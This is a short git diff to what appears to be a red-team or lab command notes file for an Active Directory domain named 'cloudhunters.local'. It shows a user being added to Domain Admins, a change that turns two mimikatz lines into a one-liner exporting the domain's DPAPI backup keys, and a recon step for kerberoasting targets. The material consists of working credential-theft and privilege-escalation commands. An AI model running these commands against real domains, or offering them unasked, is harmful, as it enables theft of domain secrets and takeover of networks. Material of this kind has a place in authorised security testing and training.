@@ -59,8 +59,7 @@ Add-ADGroupMember -Identity "Domain Admins" -Members RonHD
 Get-ADUser -Identity "ronhd" -Properties LockedOut | Select-Object SamAccountName, LockedOut
 
 # Acquire Data Protection DPAPI Keys
-mimikatz # privilege::debug
-mimikatz # lsadump::backupkeys /system:cloudhunters.local /export
+mimikatz "privilege::debug" "lsadump::backupkeys /system:cloudhunters.local /export"
 
 # Recon for kerberoasting opportuntities
 c:\Tools\ORADAD\ORADAD.exe
